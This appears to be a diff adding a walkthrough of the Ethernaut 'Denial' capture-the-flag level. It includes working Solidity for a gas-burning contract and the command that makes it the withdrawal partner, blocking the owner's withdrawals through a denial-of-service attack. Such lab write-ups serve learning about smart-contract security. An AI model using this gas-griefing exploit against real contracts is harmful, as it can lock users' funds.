@@ -1211,3 +1211,74 @@ await contract.owner() === player; // true
 Verified ownership and submitted the instance.
 
 ![Level Complete Output](assets/aliencodex.png)
+
+
+# Ethernaut Level 21: Denial
+
+## Strategy
+
+- **Vulnerability**: The `Denial` contract sends ETH to `partner` using a low-level `call` without a gas limit or checking for success.
+- **Exploit**:
+  - Created a contract (`GasBurner`) with a `receive()` function that runs an infinite loop until all gas is consumed.
+  - Set this malicious contract as the `partner`.
+  - Any future `withdraw()` calls by the owner would now consume all gas before reaching `owner.transfer(...)`, causing the transaction to fail under the 1M gas cap.
+  - This denial of service meets the level requirement, completing it without calling `withdraw()` myself.
+
+---
+
+## Vulnerability Summary
+
+```
+partner.call{value: amountToSend}(""); // No gas limit specified
+```
+
+- Sends all remaining gas to the partner.
+- If the partner burns enough gas, the remaining operations in `withdraw()` (like `transfer()`) can’t execute.
+- Effectively blocks the owner from withdrawing if `gasUsed >= 1M`.
+
+---
+
+## Exploit Steps
+
+### 1. Deployed the GasBurner Contract
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract GasBurner {
+    uint256 n;
+
+    function burn() internal {
+        while (gasleft() > 0) {
+            n += 1;
+        }
+    }
+
+    receive() external payable {
+        burn();
+    }
+}
+```
+
+- The `receive()` function runs a loop until `gasleft()` is zero, consuming all gas sent with the call.
+
+---
+
+### 2. Set `GasBurner` as the Withdrawal Partner
+
+```
+await contract.setWithdrawPartner("<gas-burner-address>");
+```
+
+- Now, any call to `withdraw()` will invoke `GasBurner.receive()`, consuming all gas and preventing `owner.transfer(...)`.
+
+---
+
+### Level Completed
+
+**did not call** `withdraw()` myself — just setting the malicious partner was enough.
+The level checks if the owner is blocked from withdrawing under a 1M gas cap.
+Submitted the instance, and the level was marked complete.
+
+![Level Complete Output](assets/denial.png)
